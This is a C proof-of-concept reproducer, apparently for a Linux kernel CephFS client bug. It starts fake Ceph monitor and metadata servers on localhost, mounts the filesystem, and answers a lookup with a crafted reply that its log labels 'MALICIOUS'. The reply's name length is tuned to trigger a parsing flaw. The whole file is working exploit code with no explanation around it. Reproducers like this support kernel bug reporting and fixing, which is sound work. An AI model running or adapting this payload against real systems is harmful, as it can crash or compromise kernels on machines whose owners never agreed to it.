// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define MON_PORT 6789
#define MDS_PORT 6800
#define MNT      "./cephmnt"

static uint32_t crc32c(uint32_t crc, const void *data, size_t len)
{
	const uint8_t *p = (const uint8_t *)data;
	while (len--) {
		int k;
		crc ^= *p++;
		for (k = 0; k < 8; k++)
			crc = (crc & 1) ? (crc >> 1) ^ 0x82F63B78u : (crc >> 1);
	}
	return crc;
}

typedef struct { unsigned char b[16384]; size_t n; } buf;

static void bclr(buf *x) { x->n = 0; }
static void bput(buf *x, const void *d, size_t l) { memcpy(x->b + x->n, d, l); x->n += l; }
static void b8(buf *x, uint8_t v) { bput(x, &v, 1); }
static void b16(buf *x, uint16_t v) { bput(x, &v, 2); }
static void b32(buf *x, uint32_t v) { bput(x, &v, 4); }
static void b64(buf *x, uint64_t v) { bput(x, &v, 8); }
static void bstr(buf *x, const char *s) { uint32_t l = strlen(s); b32(x, l); bput(x, s, l); }
static void btime(buf *x) { b32(x, 1700000000u); b32(x, 0); }

static int rd(int fd, void *p, size_t n)
{
	size_t got = 0;
	while (got < n) {
		ssize_t r = read(fd, (char *)p + got, n - got);
		if (r <= 0)
			return -1;
		got += r;
	}
	return 0;
}

static int wr(int fd, const void *p, size_t n)
{
	size_t put = 0;
	while (put < n) {
		ssize_t r = write(fd, (const char *)p + put, n - put);
		if (r <= 0)
			return -1;
		put += r;
	}
	return 0;
}

static int rskip(int fd, size_t n)
{
	char tmp[1024];
	while (n) {
		size_t c = n > sizeof(tmp) ? sizeof(tmp) : n;
		if (rd(fd, tmp, c))
			return -1;
		n -= c;
	}
	return 0;
}

#define CEPH_BANNER "ceph v027"

struct msg_hdr {
	uint64_t seq, tid;
	uint16_t type, priority, version;
	uint32_t front_len, middle_len, data_len;
	uint16_t data_off;
	uint8_t  src_type;
	uint64_t src_num;
	uint16_t compat_version, reserved;
	uint32_t crc;
} __attribute__((packed));

struct msg_connect {
	uint64_t features;
	uint32_t host_type, global_seq, connect_seq, protocol_version;
	uint32_t authorizer_protocol, authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

struct msg_connect_reply {
	uint8_t  tag;
	uint64_t features;
	uint32_t global_seq, connect_seq, protocol_version, authorizer_len;
	uint8_t  flags;
} __attribute__((packed));

#define TAG_READY          1
#define TAG_MSG            7
#define TAG_ACK            8
#define TAG_KEEPALIVE      9
#define TAG_KEEPALIVE2    14
#define TAG_KEEPALIVE2_ACK 15
#define TAG_CLOSE          6

#define MSG_MON_MAP            4
#define MSG_MON_SUBSCRIBE     15
#define MSG_MON_SUBSCRIBE_ACK 16
#define MSG_AUTH              17
#define MSG_AUTH_REPLY        18
#define MSG_MDS_MAP           21
#define MSG_CLIENT_SESSION    22
#define MSG_CLIENT_REQUEST    24
#define MSG_CLIENT_REPLY      26
#define MSG_OSD_MAP           41

#define ENT_MON 1
#define ENT_MDS 2

static const unsigned char FSID[16] = {
	0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
	0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00
};

static void send_msg(int fd, uint64_t *seq, int type, uint64_t tid, int version,
		     const void *front, uint32_t front_len,
		     uint8_t src_type, uint64_t src_num)
{
	struct msg_hdr h;
	unsigned char foot[21];
	uint8_t tag = TAG_MSG;
	uint32_t fc;

	memset(&h, 0, sizeof(h));
	h.seq = ++(*seq);
	h.tid = tid;
	h.type = type;
	h.priority = 127;
	h.version = version;
	h.front_len = front_len;
	h.src_type = src_type;
	h.src_num = src_num;
	h.crc = crc32c(0, &h, offsetof(struct msg_hdr, crc));

	fc = crc32c(0, front, front_len);
	memset(foot, 0, sizeof(foot));
	memcpy(foot, &fc, 4);
	foot[20] = 1;

	if (wr(fd, &tag, 1) || wr(fd, &h, sizeof(h)) ||
	    (front_len && wr(fd, front, front_len)) || wr(fd, foot, sizeof(foot)))
		fprintf(stderr, "[srv] send_msg failed\n");
}

static int do_handshake(int fd, uint16_t myport)
{
	unsigned char banner[9 + 136 + 136];
	unsigned char cb[9 + 136];
	struct msg_connect c;
	struct msg_connect_reply r;

	memset(banner, 0, sizeof(banner));
	memcpy(banner, CEPH_BANNER, 9);

	{
		unsigned char *a = banner + 9 + 136;

		a[8] = 0x00; a[9] = 0x02;
		a[10] = 0; a[11] = 0;
		a[12] = 127; a[13] = 0; a[14] = 0; a[15] = 1;
	}
	(void)myport;

	if (wr(fd, banner, sizeof(banner)))
		return -1;
	if (rd(fd, cb, sizeof(cb)))
		return -1;
	if (memcmp(cb, CEPH_BANNER, 9)) {
		fprintf(stderr, "[srv] bad client banner\n");
		return -1;
	}
	if (rd(fd, &c, sizeof(c)))
		return -1;
	if (c.authorizer_len && rskip(fd, c.authorizer_len))
		return -1;

	memset(&r, 0, sizeof(r));
	r.tag = TAG_READY;
	r.features = ~0ULL;
	r.global_seq = 1;
	r.connect_seq = c.connect_seq + 1;
	r.protocol_version = c.protocol_version;
	r.authorizer_len = 0;
	r.flags = 0;
	if (wr(fd, &r, sizeof(r)))
		return -1;
	fprintf(stderr, "[srv:%u] handshake done (cseq=%u alen=%u)\n",
		myport, c.connect_seq, c.authorizer_len);
	return 0;
}

static int recv_item(int fd, unsigned char *fbuf, size_t fbufsz,
		     uint32_t *front_len_out, uint64_t *tid_out)
{
	uint8_t tag;
	struct msg_hdr h;
	unsigned char foot[21];
	unsigned char ts[8];

	if (rd(fd, &tag, 1))
		return -1;
	switch (tag) {
	case TAG_MSG:
		if (rd(fd, &h, sizeof(h)))
			return -1;
		if (h.front_len > fbufsz)
			return -1;
		if (h.front_len && rd(fd, fbuf, h.front_len))
			return -1;
		if (h.middle_len && rskip(fd, h.middle_len))
			return -1;
		if (h.data_len && rskip(fd, h.data_len))
			return -1;
		if (rd(fd, foot, sizeof(foot)))
			return -1;
		*front_len_out = h.front_len;
		*tid_out = h.tid;
		return (int)h.type;
	case TAG_ACK:
		return rskip(fd, 8) ? -1 : 0;
	case TAG_KEEPALIVE:
		return 0;
	case TAG_KEEPALIVE2:
		if (rd(fd, ts, 8))
			return -1;
		{
			uint8_t a = TAG_KEEPALIVE2_ACK;
			if (wr(fd, &a, 1) || wr(fd, ts, 8))
				return -1;
		}
		return 0;
	case TAG_KEEPALIVE2_ACK:
		return rskip(fd, 8) ? -1 : 0;
	case TAG_CLOSE:
		return -1;
	default:
		fprintf(stderr, "[srv] unknown tag %u\n", tag);
		return -1;
	}
}

static void enc_entity_addr(buf *x, uint16_t port)
{
	b8(x, 1);
	b8(x, 1);
	b8(x, 1);
	b32(x, 4 + 4 + 4 + 16);
	b32(x, 1);
	b32(x, 0);
	b32(x, 16);
	b16(x, 2);
	{ uint16_t p = htons(port); bput(x, &p, 2); }
	{ uint32_t a = htonl(0x7f000001); bput(x, &a, 4); }
	b64(x, 0);
}

static void build_monmap(buf *out)
{
	buf blob;

	bclr(&blob);
	b8(&blob, 3);
	b8(&blob, 1);
	b32(&blob, 0);
	bput(&blob, FSID, 16);
	b32(&blob, 1);
	b32(&blob, 1);
	bstr(&blob, "a");
	enc_entity_addr(&blob, MON_PORT);
	*(uint32_t *)(blob.b + 2) = blob.n - 6;

	bclr(out);
	b32(out, blob.n);
	bput(out, blob.b, blob.n);
}

static void build_mdsmap(buf *out)
{
	buf m;

	bclr(&m);
	b8(&m, 1);
	b8(&m, 1);
	b32(&m, 2);
	b32(&m, 1);
	b32(&m, 0);
	b32(&m, 0);
	b32(&m, 60);
	b32(&m, 300);
	b64(&m, 1ULL << 40);
	b32(&m, 1);
	b32(&m, 1);

	b64(&m, 100);
	b8(&m, 3);
	b64(&m, 100);
	bstr(&m, "a");
	b32(&m, 0);
	b32(&m, 1);
	b32(&m, 13);
	b64(&m, 1);
	enc_entity_addr(&m, MDS_PORT);
	b32(&m, 0); b32(&m, 0);
	b32(&m, 0);
	b32(&m, 0);
	b32(&m, 0);

	b32(&m, 0);
	b64(&m, 0);

	bclr(out);
	bput(out, FSID, 16);
	b32(out, 2);
	b32(out, m.n);
	bput(out, m.b, m.n);
}

static void build_osdmap(buf *out)
{
	buf c, o;

	bclr(&c);
	b32(&c, 0x00010000);
	b32(&c, 0);
	b32(&c, 0);
	b32(&c, 0);
	b32(&c, 0);
	b32(&c, 0);
	b32(&c, 0);

	bclr(&o);
	b8(&o, 8);
	b8(&o, 7);
	b32(&o, 0);
	b8(&o, 2);
	b8(&o, 1);
	b32(&o, 0);
	bput(&o, FSID, 16);
	b32(&o, 1);
	btime(&o);
	btime(&o);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, 0);
	b32(&o, c.n);
	bput(&o, c.b, c.n);

	bclr(out);
	bput(out, FSID, 16);
	b32(out, 0);
	b32(out, 1);
	b32(out, 1);
	b32(out, o.n);
	bput(out, o.b, o.n);
}

static void mon_server(int lfd)
{
	unsigned char fbuf[65536];
	uint64_t oseq = 0, tid;
	uint32_t flen;
	int fd, type;
	buf f;

	for (;;) {
		fd = accept(lfd, NULL, NULL);
		if (fd < 0)
			return;
		{ int one = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)); }
		fprintf(stderr, "[mon] client connected\n");
		oseq = 0;
		if (do_handshake(fd, MON_PORT)) { close(fd); continue; }

		for (;;) {
			type = recv_item(fd, fbuf, sizeof(fbuf), &flen, &tid);
			if (type < 0)
				break;
			if (type == 0)
				continue;
			fprintf(stderr, "[mon] msg type %d len %u\n", type, flen);
			if (type == MSG_AUTH) {
				bclr(&f);
				b32(&f, 1);
				b32(&f, 0);
				b64(&f, 4242);
				b32(&f, 0);
				b32(&f, 0);
				send_msg(fd, &oseq, MSG_AUTH_REPLY, 0, 1, f.b, f.n, ENT_MON, 0);
			} else if (type == MSG_MON_SUBSCRIBE) {
				bclr(&f);
				b32(&f, 300);
				bput(&f, FSID, 16);
				send_msg(fd, &oseq, MSG_MON_SUBSCRIBE_ACK, 0, 1, f.b, f.n, ENT_MON, 0);

				build_monmap(&f);
				send_msg(fd, &oseq, MSG_MON_MAP, 0, 1, f.b, f.n, ENT_MON, 0);

				build_osdmap(&f);
				send_msg(fd, &oseq, MSG_OSD_MAP, 0, 1, f.b, f.n, ENT_MON, 0);

				build_mdsmap(&f);
				send_msg(fd, &oseq, MSG_MDS_MAP, 0, 1, f.b, f.n, ENT_MON, 0);
				fprintf(stderr, "[mon] sent monmap/osdmap/mdsmap\n");
			}
		}
		fprintf(stderr, "[mon] client gone\n");
		close(fd);
	}
}

static char g_name[64];

static void enc_inodestat(buf *tr, uint64_t ino, uint32_t caps, uint32_t capseq,
			  uint8_t capflags)
{
	buf in;

	bclr(&in);

	b64(&in, ino);
	b64(&in, 0xfffffffffffffffeULL);
	b32(&in, 0);
	b64(&in, 1);
	b64(&in, 1);

	b32(&in, caps);
	b32(&in, 0);
	b64(&in, 1);
	b32(&in, capseq);
	b32(&in, 1);
	b64(&in, 1);
	b8(&in, capflags);

	b32(&in, 4194304); b32(&in, 1); b32(&in, 4194304);
	b32(&in, 0); b32(&in, 0); b32(&in, 0xffffffffu); b32(&in, 1);
	btime(&in); btime(&in); btime(&in);
	b32(&in, 0);
	b64(&in, 0);
	b64(&in, 0);
	b64(&in, 0);
	b32(&in, 1);
	b32(&in, 0040755);
	b32(&in, 0); b32(&in, 0);
	b32(&in, 2);
	b64(&in, 1);
	b64(&in, 1);
	b64(&in, 0); b64(&in, 0); b64(&in, 0);
	btime(&in);
	b32(&in, 0);

	b32(&in, 0);

	b8(&in, 2); b8(&in, 0); b16(&in, 0); b32(&in, 0);

	b32(&in, 0);

	b64(&in, 0xffffffffffffffffULL);
	b32(&in, 0);

	b8(&in, 1); b8(&in, 1); b32(&in, 16); b64(&in, 0); b64(&in, 0);

	b32(&in, 0);

	btime(&in);

	b64(&in, 0);

	b8(tr, 1);
	b8(tr, 1);
	b32(tr, in.n);
	bput(tr, in.b, in.n);
}

static void build_reply_root(buf *out)
{
	buf tr, sb;

	bclr(&tr);
	enc_inodestat(&tr, 1, 1 | 4, 1, 1);

	bclr(&sb);
	b64(&sb, 1);
	b64(&sb, 0);
	b64(&sb, 0);
	b64(&sb, 0);
	b64(&sb, 1);
	b32(&sb, 0);
	b32(&sb, 0);

	bclr(out);
	b32(out, 0x00101);
	b32(out, 0);
	b32(out, 2);
	b8(out, 1);
	b8(out, 0);
	b8(out, 1);
	b32(out, tr.n);
	bput(out, tr.b, tr.n);
	b32(out, 0);
	b32(out, sb.n);
	bput(out, sb.b, sb.n);
}

static void build_reply_lookup(buf *out)
{
	buf tr;

	bclr(&tr);

	enc_inodestat(&tr, 1, 1 | 4 | 0x100, 2, 1);

	b8(&tr, 1); b8(&tr, 1); b32(&tr, 12);
	b32(&tr, 0);
	b32(&tr, 0);
	b32(&tr, 0);

	bstr(&tr, g_name);

	b8(&tr, 1);
	b8(&tr, 1);
	b32(&tr, 1);
	b8(&tr, 0x01);

	bclr(out);
	b32(out, 0x00100);
	b32(out, (uint32_t)-2);
	b32(out, 2);
	b8(out, 1);
	b8(out, 1);
	b8(out, 0);
	b32(out, tr.n);
	bput(out, tr.b, tr.n);
	b32(out, 0);
	b32(out, 0);
}

static void pick_name(void)
{
	int k;
	buf f;

	for (k = 4; k <= 24; k++) {
		memset(g_name, 0, sizeof(g_name));
		memset(g_name, 'a', k);
		build_reply_lookup(&f);
		if (f.n % 8 == 0)
			return;
	}
	memset(g_name, 0, sizeof(g_name));
	memcpy(g_name, "aaaa", 4);
}

static void mds_server(int lfd)
{
	unsigned char fbuf[65536];
	uint64_t oseq = 0, tid;
	uint32_t flen;
	int fd, type;
	buf f;

	for (;;) {
		fd = accept(lfd, NULL, NULL);
		if (fd < 0)
			return;
		{ int one = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)); }
		fprintf(stderr, "[mds] client connected\n");
		oseq = 0;
		if (do_handshake(fd, MDS_PORT)) { close(fd); continue; }

		for (;;) {
			type = recv_item(fd, fbuf, sizeof(fbuf), &flen, &tid);
			if (type < 0)
				break;
			if (type == 0)
				continue;
			fprintf(stderr, "[mds] msg type %d(0x%x) len %u tid %llu\n",
				type, type, flen, (unsigned long long)tid);

			if (type == MSG_CLIENT_SESSION) {
				uint32_t op = flen >= 4 ? *(uint32_t *)fbuf : 0;
				if (op != 0)
					continue;
				bclr(&f);
				b32(&f, 1);
				b64(&f, 1);
				btime(&f);
				b32(&f, 100000);
				b32(&f, 100000);
				b32(&f, 0);
				b32(&f, 8);
				b64(&f, 1ULL << 9);
				send_msg(fd, &oseq, MSG_CLIENT_SESSION, 0, 3, f.b, f.n, ENT_MDS, 0);
				fprintf(stderr, "[mds] session opened\n");
			} else if (type == MSG_CLIENT_REQUEST) {
				uint32_t op = flen >= 26 ? *(uint32_t *)(fbuf + 22) : 0;
				fprintf(stderr, "[mds] request op 0x%x tid %llu\n",
					op, (unsigned long long)tid);
				if (op == 0x00101) {
					build_reply_root(&f);
					send_msg(fd, &oseq, MSG_CLIENT_REPLY, tid, 1,
						 f.b, f.n, ENT_MDS, 0);
					fprintf(stderr, "[mds] sent root reply (%zu bytes)\n", f.n);
				} else if (op == 0x00100) {
					build_reply_lookup(&f);
					send_msg(fd, &oseq, MSG_CLIENT_REPLY, tid, 1,
						 f.b, f.n, ENT_MDS, 0);
					fprintf(stderr, "[mds] sent MALICIOUS lookup reply "
						"(front_len=%zu)\n", f.n);
				} else {

					bclr(&f);
					b32(&f, op);
					b32(&f, (uint32_t)-2);
					b32(&f, 2);
					b8(&f, 1); b8(&f, 0); b8(&f, 0);
					b32(&f, 0); b32(&f, 0); b32(&f, 0);
					send_msg(fd, &oseq, MSG_CLIENT_REPLY, tid, 1,
						 f.b, f.n, ENT_MDS, 0);
				}
			}
		}
		fprintf(stderr, "[mds] client gone\n");
		close(fd);
	}
}

static int listen_on(uint16_t port)
{
	struct sockaddr_in sa;
	int fd, one = 1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) { perror("socket"); exit(1); }
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7f000001);
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa))) { perror("bind"); exit(1); }
	if (listen(fd, 8)) { perror("listen"); exit(1); }
	return fd;
}

int main(void)
{
	int mon_lfd, mds_lfd;
	pid_t p1, p2;
	char path[128];
	struct stat st;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	pick_name();
	fprintf(stderr, "[poc] target dentry name: '%s'\n", g_name);

	mon_lfd = listen_on(MON_PORT);
	mds_lfd = listen_on(MDS_PORT);

	p1 = fork();
	if (p1 == 0) { close(mds_lfd); mon_server(mon_lfd); _exit(0); }
	p2 = fork();
	if (p2 == 0) { close(mon_lfd); mds_server(mds_lfd); _exit(0); }

	mkdir(MNT, 0755);

	fprintf(stderr, "[poc] mounting cephfs...\n");
	if (mount("127.0.0.1:6789:/", MNT, "ceph", 0, "name=admin") != 0) {
		fprintf(stderr, "[poc] mount failed: %s\n", strerror(errno));
		goto out;
	}
	fprintf(stderr, "[poc] mount OK, triggering lookup\n");

	snprintf(path, sizeof(path), "%s/%s", MNT, g_name);
	if (stat(path, &st) != 0)
		fprintf(stderr, "[poc] stat('%s') -> %s (expected ENOENT)\n",
			path, strerror(errno));

	fprintf(stderr, "[poc] done\n");
	sleep(2);
	umount2(MNT, MNT_FORCE | MNT_DETACH);
out:
	sleep(1);
	kill(p1, SIGKILL);
	kill(p2, SIGKILL);
	return 0;
}
